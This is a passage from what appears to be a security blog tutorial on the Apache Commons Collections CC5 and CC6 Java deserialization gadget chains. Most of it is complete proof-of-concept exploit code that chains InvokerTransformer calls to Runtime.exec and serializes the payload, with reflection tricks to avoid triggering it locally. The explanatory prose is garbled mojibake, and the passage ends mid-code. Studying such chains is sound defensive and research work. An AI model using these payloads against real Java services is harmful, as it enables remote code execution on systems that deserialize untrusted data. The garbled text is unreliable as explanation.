<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(tiedMapEntry);<br></code></pre></td></tr></table></figure>

<p>å› æ­¤é€šè¿‡åå°„ä¿®æ”¹æ¥è§„é¿è§¦å‘</p>
<h3 id="Gadget-4"><a href="#Gadget-4" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC5;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-number">1</span>);<br>        BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-number">1</span>);<br>        Field valF = BadAttributeValueExpException.class.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valF.setAccessible(<span class="hljs-keyword">true</span>);<br>        valF.set(badAttributeValueExpException,tiedMapEntry);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(badAttributeValueExpException);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h2><h3 id="Pre-5"><a href="#Pre-5" class="headerlink" title="Pre"></a>Pre</h3><h4 id="é™åˆ¶-5"><a href="#é™åˆ¶-5" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h4><blockquote>
<p>jdk æš‚æ— é™åˆ¶</p>
<p>CommonsCollections 3.1 - 3.2.1</p>
</blockquote>
<h4 id="åˆ©ç”¨é“¾-5"><a href="#åˆ©ç”¨é“¾-5" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">                    ...</span><br><span class="hljs-operator">                    </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

<h4 id="å…³é”®ç±»-5"><a href="#å…³é”®ç±»-5" class="headerlink" title="å…³é”®ç±»"></a>å…³é”®ç±»</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">HashSet</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br></code></pre></td></tr></table></figure>

<p>CC6 ä»ç„¶å’Œ CC5 æ€è·¯ç›¸åŒï¼Œå‰åŠéƒ¨åˆ†éƒ½æ˜¯ CC1ï¼ŒCC5 ç”¨äº†<code>TiedMapEntry.toString</code>æ–¹æ³•è¿›è€Œè°ƒç”¨å…¶<code>getValue</code>ï¼Œè§¦å‘<code>LazyMap.get</code>å RCE</p>
<p>CC6 ä½¿ç”¨çš„æ˜¯<code>TiedMapEntry.hashcode</code>æ–¹æ³•æ¥è§¦å‘çš„ä¸ CC5<code>toString</code>ä¸€æ ·è°ƒç”¨å…¶<code>getValue</code>ï¼Œè¿›è€Œè§¦å‘<code>LazyMap.get</code>RCE</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20230424201812179.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>&#123;<br>    Object value = getValue();<br>    <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>           (value == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : value.hashCode());<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getValue</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6poc</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br><span class="hljs-comment">//                , new ConstantTransformer(1)</span><br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br><span class="hljs-comment">//        tiedMapEntry.toString();//CC5</span><br>        tiedMapEntry.hashCode();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>åŒæ ·çš„ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªç±»æ¥è°ƒç”¨å…¶<code>hashCode</code>æ–¹æ³•ï¼ŒCC6 ä½¿ç”¨çš„æ˜¯<code>HashMap.hash</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(Object key)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-keyword">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œ key å¹¶ä¸å¯æ§ï¼Œè¿˜å¾—æ‰¾è°ƒç”¨å…¶<code>hash</code>æ–¹æ³•ï¼Œè¿˜æ˜¯<code>HashMap</code>ä¸­çš„<code>put</code>æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">true</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ç°åœ¨éœ€è¦æ‰¾åˆ°ä¸€ä¸ªè°ƒç”¨äº†<code>HashMap.put</code>å¹¶ä¸”ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§çš„æ–¹æ³•ï¼Œæœ€ç»ˆæ‰¾åˆ°äº†<code>HashSet</code>å¤å†™ç‚¹ä¸­çš„<code>put</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">HashSet</span><span class="hljs-params">()</span> </span>&#123;<br>       map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>   &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span>&#123;<br>       ...<br>       <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;size; i++) &#123;<br>           <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>               E e = (E) s.readObject();<br>           map.put(e, PRESENT);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>

<p><code>e</code>å¦‚ä½•æ§åˆ¶å‘¢ï¼Œçœ‹çœ‹<code>writeObject</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span></span><br><span class="hljs-function">    <span class="hljs-keyword">throws</span> java.io.IOException </span>&#123;<br>    <span class="hljs-comment">// Write out any hidden serialization magic</span><br>    s.defaultWriteObject();<br><br>    <span class="hljs-comment">// Write out HashMap capacity and load factor</span><br>    s.writeInt(map.capacity());<br>    s.writeFloat(map.loadFactor());<br><br>    <span class="hljs-comment">// Write out size</span><br>    s.writeInt(map.size());<br><br>    <span class="hljs-comment">// Write out all elements in the proper order.</span><br>    <span class="hljs-keyword">for</span> (E e : map.keySet())<br>        s.writeObject(e);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ˜¯é€šè¿‡<code>map.keySet</code>å¢å¼º for å†™å…¥çš„ï¼Œå› æ­¤<code>HashMap</code>ä¸­è¦è°ƒç”¨<code>keySet</code>æ–¹æ³•å¹¶ä¼ å…¥ä»»æ„å€¼</p>
<p>æ•´ä¸ªé“¾æ¡æ¸…æ™°äº†ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°<code>HashMap.put</code>è°ƒç”¨<code>HashMap.hash</code>çš„è¿‡ç¨‹å¾ˆç†Ÿæ‚‰ï¼Œæ²¡é”™æ­£æ˜¯<code>URLDNS</code>é“¾ä¸­çš„å†…å®¹ï¼Œå…¶å®å·²ç»å°±å¯ä»¥é€šè¿‡<code>HashMap.readObject</code>æ¥è°ƒç”¨äº†</p>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43263451/article/details/126073035">1</a> <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43610673/article/details/125079601">2</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//yso CC6: HashSet.readObject-&gt;HashMap.put-&gt;HashMap.hash</span><br>	<span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">put</span><span class="hljs-params">(K key, V value)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">true</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//URLDNS: HashMap.readObject-&gt;HashMap.hash</span><br>	<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">			...</span><br><span class="hljs-function">            <span class="hljs-title">for</span> <span class="hljs-params">(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mappings; i++)</span> </span>&#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    K key = (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    V value = (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>å› æ­¤å…ˆæ¥ä¸ªç®€å•çš„ poc(URLDNS å¼ï¼ŒåŸè°…æˆ‘è¿™æ ·å¤‡æ³¨å®ƒ)</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6Ez</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-number">1</span>)<br>        &#125;);<br><br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm,chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-string">&quot;a&quot;</span>);<br>        HashMap exphm = <span class="hljs-keyword">new</span> HashMap();<br>        exphm.put(tiedMapEntry,<span class="hljs-string">&quot;c&quot;</span>);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(exphm);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br><span class="hljs-comment">//        ois.readObject();</span><br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>åˆ°è¿™é‡Œå°±å®Œäº†ï¼Ÿå…¶å®è¿˜æ˜¯ç¼–å†™è¿‡ç¨‹ä¸­æ²¡æœ‰åˆ°è¾¾<code>ois.readObject</code>å°±å·²ç»è§¦å‘ï¼Œä¹Ÿå°±æ˜¯è¯´æ²¡æœ‰è§„é¿åˆ°æœ¬åœ°è§¦å‘ï¼Œä¸ä¿¡å¯ä»¥æ³¨é‡Š<code>ois.readObject</code>æˆ‘ä»¬å‘ç°å‹æ ¹æ²¡æœ‰ååºåˆ—åŒ– RCE æˆåŠŸï¼Œé‚£å°±åŠ ä¸€ä¸ªå‡é“¾ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6EzbyP</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Transformer[] transformers = &#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;),<br>                